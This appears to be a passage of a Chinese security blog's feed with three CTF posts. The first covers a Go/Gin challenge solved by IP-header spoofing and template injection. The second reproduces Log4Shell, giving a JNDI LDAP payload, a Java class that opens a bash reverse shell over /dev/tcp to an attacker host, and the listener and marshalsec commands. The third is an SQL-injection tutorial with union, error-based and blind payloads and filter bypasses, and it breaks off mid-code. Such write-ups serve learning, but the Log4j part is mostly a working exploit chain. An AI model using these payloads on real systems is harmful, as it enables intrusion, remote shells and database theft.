    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>最近也是刚刚放假，比较忙，就看了看这个SCTF</p><p>比赛快到尾声的时候才抽出空来看看题</p><p>按照惯例，肯定是要看看分最少的题</p><p><img src="https://s2.loli.net/2021/12/28/mngcZIhCjubBt4Y.png"></p><p>这道题被我看中了，我打算研究一下这个题</p><p>附件是一份源码，而且是go语言的源码</p><p>我们来看一看</p><p>题中源码给了<code>middleware.go</code></p><p>此时我们应该理解一下go语言的中间件是起到什么作用的</p><pre class="line-numbers language-none"><code class="language-none">有时候在执行实际Handler里面的逻辑的时候想要预处理或者后处理一些行为（比如写入log、统计执行时间等等）；有时候我们想要在调用一个Handler之前或之后调用另一个Handler。这时我们就需要用到中间件这个中间处理函数，把我们实际使用的Handler放在中间件里面，以实现额外的功能。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以我们先来看看<code>middleware.go</code>定义了什么</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> middleware<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"github.com/gin-gonic/gin"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">LocalRequired</span><span class="token punctuation">(</span><span class="token punctuation">)</span> gin<span class="token punctuation">.</span>HandlerFunc <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> c<span class="token punctuation">.</span><span class="token function">GetHeader</span><span class="token punctuation">(</span><span class="token string">"x-forwarded-for"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">""</span> <span class="token operator">||</span> c<span class="token punctuation">.</span><span class="token function">GetHeader</span><span class="token punctuation">(</span><span class="token string">"x-client-ip"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">AbortWithStatus</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span>ip <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">ClientIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> ip <span class="token operator">==</span> <span class="token string">"127.0.0.1"</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">Next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">AbortWithStatus</span><span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里导入了一个包<code>github.com/gin-gonic/gin</code></p><p>我们来看一下该包的描述</p><pre class="line-numbers language-none"><code class="language-none">Gin is a web framework written in Go (Golang). It features a martini-like API with performance that is up to 40 times faster thanks to httprouter. If you need performance and good productivity, you will love Gin.-------------------------------------------------------------------------------Gin 是一个用 Go (Golang) 编写的 Web 框架。 它具有类似martini-like的 API，由于 httprouter，性能提高了 40 倍。 如果您需要性能和良好的生产力，您会喜欢 Gin。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>到这里其实就有那么一点能感觉到这个题的做法了</p><p>接着往下看</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">LocalRequired</span><span class="token punctuation">(</span><span class="token punctuation">)</span> gin<span class="token punctuation">.</span>HandlerFunc <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> c<span class="token punctuation">.</span><span class="token function">GetHeader</span><span class="token punctuation">(</span><span class="token string">"x-forwarded-for"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">""</span> <span class="token operator">||</span> c<span class="token punctuation">.</span><span class="token function">GetHeader</span><span class="token punctuation">(</span><span class="token string">"x-client-ip"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">AbortWithStatus</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span>ip <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">ClientIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> ip <span class="token operator">==</span> <span class="token string">"127.0.0.1"</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">Next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">AbortWithStatus</span><span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里就是简单的获取数据头的函数</p><p>其中</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">if</span> c<span class="token punctuation">.</span><span class="token function">GetHeader</span><span class="token punctuation">(</span><span class="token string">"x-forwarded-for"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">""</span> <span class="token operator">||</span> c<span class="token punctuation">.</span><span class="token function">GetHeader</span><span class="token punctuation">(</span><span class="token string">"x-client-ip"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">AbortWithStatus</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里定义到如果存在<code>x-forwarded-for</code>或者<code>x-client-ip</code>就会返回403</p><p>但是还需要<code>ip == "127.0.0.1"</code></p><p>百度一下就知道<code>x-real-ip</code>这个头</p><p>中间件看完了，接着往下看<code>route.go</code></p><p>这里就能看到端倪了</p><p><img src="https://s2.loli.net/2021/12/28/lxBI8CbO1GSAv7z.png"></p><p>go语言模板渲染支持传入一个结构体的实例来渲染它的字段，就有可能造成信息泄露</p><p>而在<code>route.go</code>中恰巧传入了一个结构体，我们接着看<code>structs.go</code></p><p><img src="https://s2.loli.net/2021/12/28/1skx46AtozDYZWw.png"></p><p>到这里已经真相大白了</p><pre class="line-numbers language-none"><code class="language-none">1、首先构造ip伪造2、在age变量中存在ssti信息泄露出flag3、干他！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2021/12/28/6iWPjTBNDtnfegm.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="wp" scheme="http://h3geeker.top/categories/wp/"/>
    
    
    <category term="大赛wp" scheme="http://h3geeker.top/tags/%E5%A4%A7%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOWLog4j复现</title>
    <link href="http://h3geeker.top/posts/b8d6ddff.html"/>
    <id>http://h3geeker.top/posts/b8d6ddff.html</id>
    <published>2021-12-10T15:10:21.792Z</published>
    <updated>2021-12-10T15:59:48.785Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2021/12/10/ro29tnOAhk1jF5Y.png"></p><p>今天上午刚刚看完这个洞，自己复现了一下，晚上就看到了上题正好打一下玩玩</p><p><img src="https://s2.loli.net/2021/12/10/ZlN2WgRQdzS8AEX.png"></p><p>多明显的输入框，嘿嘿嘿</p><p>这不得来一个</p><pre class="line-numbers language-none"><code class="language-none">${jndi:ldap://dnslog.com/exp} (bushi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><p>首先准备好恶意Java类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>        <span class="token keyword">static</span><span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token class-name">Runtime</span> r <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> cmd<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"exec 5&lt;&gt;/dev/tcp/xxx/50025;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>                <span class="token class-name">Process</span> p <span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>                p<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>能弹shell就行，怎么写都行</p><p>然后准备好<code>marshalsec-0.0.3-SNAPSHOT-all.jar</code></p><h3 id="0x02-监听端口"><a href="#0x02-监听端口" class="headerlink" title="0x02 监听端口"></a>0x02 监听端口</h3><pre class="line-numbers language-none"><code class="language-none">nc -lvnp 50025<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2021/12/10/O8SjNG92Uf1QX37.png"></p><h3 id="0x03-起http服务"><a href="#0x03-起http服务" class="headerlink" title="0x03 起http服务"></a>0x03 起http服务</h3><pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 50026<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2021/12/10/jMlOFDwYbfemXxJ.png"></p><p>注意这里要在恶意Java类的目录下起http服务</p><h3 id="0x04-起LDAP服务"><a href="#0x04-起LDAP服务" class="headerlink" title="0x04 起LDAP服务"></a>0x04 起LDAP服务</h3><pre class="line-numbers language-none"><code class="language-none">java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://xxx:50026/#Test"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里的端口要和http服务的端口一致！！</p><p><img src="https://s2.loli.net/2021/12/10/4VGjPHR6alkZpiX.png"></p><h3 id="0x05-干他！"><a href="#0x05-干他！" class="headerlink" title="0x05 干他！"></a>0x05 干他！</h3><p>喜闻乐见的的地方来了</p><p><img src="https://s2.loli.net/2021/12/10/HYIxczbTaO312Ri.png"></p><p>点击<code>submit</code></p><p><img src="https://s2.loli.net/2021/12/10/TIUaXqQ8Z2Vf1z4.png"></p><p>可以看到这里已经加载了恶意类，而我们监听的端口已经反弹到了shell</p><p><img src="https://s2.loli.net/2021/12/10/8I2WptXjFAYCZbL.png"></p><p>打完收工！</p><p>后续也会写一下这个漏洞的源码分析，就是不知道让不让发。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2021/12/10/ro29tnOAhk1jF5Y.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;今天上午刚刚看完这个洞，自己复现了一下，晚上就看到了上题正好打一下玩玩&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.lol</summary>
      
    
    
    
    <category term="wp" scheme="http://h3geeker.top/categories/wp/"/>
    
    
    <category term="做题记录" scheme="http://h3geeker.top/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入基础</title>
    <link href="http://h3geeker.top/posts/e1ba94c8.html"/>
    <id>http://h3geeker.top/posts/e1ba94c8.html</id>
    <published>2021-12-06T12:25:28.274Z</published>
    <updated>2021-12-06T12:29:56.638Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h1><h2 id="理解SQL注入"><a href="#理解SQL注入" class="headerlink" title="理解SQL注入"></a>理解SQL注入</h2><p>SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的SQL服务器加以解析并执行</p><pre class="line-numbers language-none"><code class="language-none">/sql.php?uid=1/sql.php?uid=1 or 1=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>SQL注入：内联注入是指插入查询注入SQL代码后，原来的查询依然会全部执行</p><pre class="line-numbers language-none"><code class="language-none">[注入]-----&gt;[原来的语句]=========&gt;[原来的(注入)语句]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="确认注入点"><a href="#确认注入点" class="headerlink" title="确认注入点"></a>确认注入点</h1><p>###字符串注入的特征值</p><table><thead><tr><th>测试字符串</th><th>变种</th><th>预期结果</th></tr></thead><tbody><tr><td>‘</td><td></td><td>触发错误。如果成功，数据库将返回一个错误</td></tr><tr><td>1’ or ‘1’=’1</td><td>1’) or (‘1’=’1</td><td>恒为真条件。如果成功，将返回表中所有的行</td></tr><tr><td>value’ or ‘1’=’2</td><td>value1’) or (‘1’=’2</td><td>空条件。如果成功，则返回与原来的值相同的结果</td></tr><tr><td>1’and ‘1’=’1</td><td>1’) adn (‘1’=1</td><td>恒为假条件。如果成功，则不返回表中任何行</td></tr><tr><td>1’ or ‘ab’ =’a’+’b</td><td>1’) or (‘ab’=’a’+’b</td><td>Sql server串联。如果成功，则返回永真条件相同的信息</td></tr><tr><td>1’ or ‘ab’ =’a’ ‘b</td><td>1’) or (‘ab’=’a’ ‘b</td><td>Mysql串联。如果成功，则返回永真条件相同的信息</td></tr><tr><td>1’ or ‘ab’=’a’||’b</td><td>1’) or (‘ab’=’a’||’b</td><td>Oracle串联。如果成功，则返回与永真条件相同的信息</td></tr></tbody></table><h3 id="数字注入的特征值"><a href="#数字注入的特征值" class="headerlink" title="数字注入的特征值"></a>数字注入的特征值</h3><table><thead><tr><th>测试字符串</th><th>变种</th><th>预期结果</th></tr></thead><tbody><tr><td>‘</td><td></td><td>触发错误。如果成功，数据库将返回一个错误</td></tr><tr><td>1+1</td><td>2-1</td><td>如果成功，则返回与操作结果相同的值</td></tr><tr><td>value+1</td><td></td><td>如果成功，则返回与原来请求相同的值</td></tr><tr><td>or 1 = 1</td><td>1) or (1-1</td><td>恒为真条件。如果成功，将返回表中所有的行</td></tr><tr><td>value or 1=2</td><td>value) or (1=2</td><td>空条件。如果成功，则返回与原来的值相同的结果</td></tr><tr><td>and 1=2</td><td>and (1=2</td><td>恒为假条件。如果成功，则不返回表中任何行</td></tr><tr><td>1’ or ‘ab’ =’a’+’b</td><td>1’) or (‘ab’=’a’+’b</td><td>Sql server串联。如果成功，则返回永真条件相同的信息</td></tr><tr><td>1’ or ‘ab’ =’a’ ‘b</td><td>1’) or (‘ab’=’a’ ‘b</td><td>Mysql串联。如果成功，则返回永真条件相同的信息</td></tr><tr><td>1’ or ‘ab’=’a’||’b</td><td>1’) or (‘ab’=’a’||’b</td><td>Oracle串联。如果成功，则返回与永真条件相同的信息</td></tr></tbody></table><h1 id="显错注入"><a href="#显错注入" class="headerlink" title="显错注入"></a>显错注入</h1><h3 id="联合查询union-select"><a href="#联合查询union-select" class="headerlink" title="联合查询union select"></a>联合查询<code>union select</code></h3><p>使用联合查询需要注意，前面的字段需要和后面的字段数相等：</p><p><code>select id,user,content from users where id=1 union select 1,2,3 </code></p><p>###order by </p><p>当我们使用 <code>order by 4 </code>成功，使用<code>order by 5</code>报错时</p><p>就可以判断字段为4</p><blockquote><p>order by是mysql中对查询数据进行排序的方法， 使用示例</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> 表名 <span class="token keyword">order</span> <span class="token keyword">by</span> 列名<span class="token punctuation">(</span>或者数字<span class="token punctuation">)</span> <span class="token keyword">asc</span>；升序<span class="token punctuation">(</span>默认升序<span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> 表名 <span class="token keyword">order</span> <span class="token keyword">by</span> 列名<span class="token punctuation">(</span>或者数字<span class="token punctuation">)</span> <span class="token keyword">desc</span>；降序<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>所以可以利用<code>order by </code>来查询字段数</p></blockquote><h3 id="注释符"><a href="#注释符" class="headerlink" title="#(注释符)"></a>#(注释符)</h3><p>在语句末尾，注释查询语句后面的多余字符</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token string">'1'</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token string">'1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">#'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>#</code>可以被<code>--+</code>代替</p><h3 id="information-schema库"><a href="#information-schema库" class="headerlink" title="information_schema库"></a>information_schema库</h3><p>Mysql5版本之后，由于<code>information_schema</code>库的存在，注入攻击相对来说方便了许多，其使用方法通常为如下几种：</p><p>通过对Mysql的数据进行猜解获取敏感的信息，来进一步通过网站的各种功能获取控制权。</p><p>通过<code>load_file()</code>函数来读取脚本代码或系统敏感文件内容，进行漏洞分析或直接获取数据库连接账号、密码。</p><p>通过<code>dumpfile/outfile</code>函数导出获取webshell</p><p>利用上面的这几种方法，可以很轻易地攻击入侵Mysql5数据库搭建的网站服务器</p><h3 id="简单的注入流程"><a href="#简单的注入流程" class="headerlink" title="简单的注入流程"></a>简单的注入流程</h3><pre class="line-numbers language-none"><code class="language-none">?id=1'//测试注入点?id=1' order by 5#//猜字段?id=0' union select 1,2,3,4# //测试页面回显?id=0' union select 1,database(),3,4# //查看数据库名?id=0' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='db'#?id=0' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name ='flag'#?id=0' union select 1,content,3,4 from flag#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h3 id="报错函数"><a href="#报错函数" class="headerlink" title="报错函数"></a>报错函数</h3><p><code>extractvalue()</code></p><p>作用是从目标xml种返回包含所查询值得字符串</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x5c</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>updatexml()</code></p><p>作用就是改变（查找并替换）xml文档中符合条件的节点值</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span><span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">0x3a</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>0x3a是<code>:</code>的作用</p><p>而且<code>updatexml()</code>较为常用</p><p>注入模板：</p><pre class="line-numbers language-none"><code class="language-none">id = 1 and(updatexml(0x3a,concat(1,(select database())),1));id = 1 and(updatexml(0x3a,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema='db')),1));id = 1 and(updatexml(0x3a,concat(1,(select group_concat(colunm_name) from information_schema.column where table_name='flag')),1));id = 1 and(updatexml(0x3a,concat(1,(select content from flag)),1));id = 1 and(updatexml(0x3a,concat(1,(select substring(content,1,10)from flag)),1));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>exp()</code></p><p>当传递有一个大于709的值，函数exp()就会引起一个溢出错误</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id  <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> EXP<span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>floor()</code></p><p>floor是mysql的一个取整函数</p><pre class="line-numbers language-none"><code class="language-none">id = 1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h4 id="布尔盲注可能用到的函数"><a href="#布尔盲注可能用到的函数" class="headerlink" title="布尔盲注可能用到的函数"></a>布尔盲注可能用到的函数</h4><p><code>ascii()</code>括号中的参数转化为相应的ascii码</p><p><code>substr()</code>substr(a,b,c)从b位置开始，截取字符串a的c长度</p><p><code>mid()</code>用法与<code>substr()</code>类似</p><p><code>length()</code>返回str字符串的长度</p><p><code>left(database(),1)</code>取database字符串的左边第一个</p><h3 id="时间盲注可能用到的函数"><a href="#时间盲注可能用到的函数" class="headerlink" title="时间盲注可能用到的函数"></a>时间盲注可能用到的函数</h3><p><code>if(a,b,c)</code>a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0)，返回0</p><p><code>sleep()</code>执行挂起一段时间</p><p>利用方式：</p><pre class="line-numbers language-none"><code class="language-none">and if(mid(version(),1,1)=1,sleep(10),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h3><p>= = 百度上很多</p><p>自己写！！</p><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token punctuation">(</span><span class="token single-quoted-string string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/select|union/'</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'hack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"SELECT first_name,lastname FROM users WHERE user_id='<span class="token interpolation"><span class="token variable">$id</span></span>';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span><span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'firstname'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token single-quoted-string string">':'</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'lastname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/select/union/'</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'hack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>因为这里没加<span class="token operator">/</span>select<span class="token operator">/</span>union<span class="token operator">/</span>i 所以可以<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>sql语句是不区分大小写的少数情况下代码中没有过滤完整就可以使用大小写的方法绕过</p><p><img src="https://s2.loli.net/2021/12/06/rMg5cNlkdtKPx38.png" alt="image-20210919112209321"></p><h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token punctuation">(</span><span class="token single-quoted-string string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/select|union/i'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"SELECT first_name,lastname FROM users WHERE user_id='<span class="token interpolation"><span class="token variable">$id</span></span>';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span><span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'firstname'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token single-quoted-string string">':'</span><span class="token punctuation">.</span><span class="token 